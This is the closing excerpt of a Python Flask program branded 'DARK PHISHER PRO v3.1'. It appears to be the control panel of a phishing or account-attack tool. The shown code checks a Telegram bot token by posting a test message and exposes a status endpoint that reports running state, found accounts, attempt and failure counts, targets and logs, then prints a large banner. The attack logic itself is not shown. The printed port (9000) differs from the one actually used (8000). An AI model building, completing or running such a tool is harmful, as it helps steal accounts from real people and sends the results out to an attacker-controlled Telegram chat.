            requests.post(send_url, json={'chat_id': chatid, 'text': test_msg}, timeout=10)
            return jsonify({'status': 'ok', 'message': f'✅ Connected to @{username}'})
        else:
            return jsonify({'status': 'error', 'message': '❌ Invalid token'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'❌ Connection error: {str(e)[:30]}'})

@app.route('/api/status', methods=['POST'])
def api_status():
    global phisher_running, found_accounts, attempt_counter, fail_counter, current_targets, attempt_logs
    return jsonify({
        'running': phisher_running,
        'found': len(found_accounts),
        'attempts': attempt_counter,
        'fail': fail_counter,
        'targets': current_targets[-30:],
        'logs': attempt_logs[-20:]
    })

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██╗███████╗██╗  ║
    ║     ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║██╔════╝██║  ║
    ║     ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║█████╗  ██║  ║
    ║     ██║  ██║██╔══██║██╔═══╝ ██╔═██╗ ██╔══██╗██║██╔══╝  ██║  ║
    ║     ██████╔╝██║  ██║██║     ██║  ██╗██████╔╝██║██║     ██║  ║
    ║     ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝     ╚═╝  ║
    ║              ██████╗ ██████╗  ██████╗                         ║
    ║              ██╔══██╗██╔══██╗██╔═══██╗                        ║
    ║              ██████╔╝██████╔╝██║   ██║                        ║
    ║              ██╔═══╝ ██╔══██╗██║   ██║                        ║
    ║              ██║     ██║  ██║╚██████╔╝                        ║
    ║              ╚═╝     ╚═╝  ╚═╝ ╚═════╝                         ║
    ║                                                               ║
    ║         ═══ DARK PHISHER PRO v3.1 ═══                         ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print("[*] Starting server on 0.0.0.0:9000")
    app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
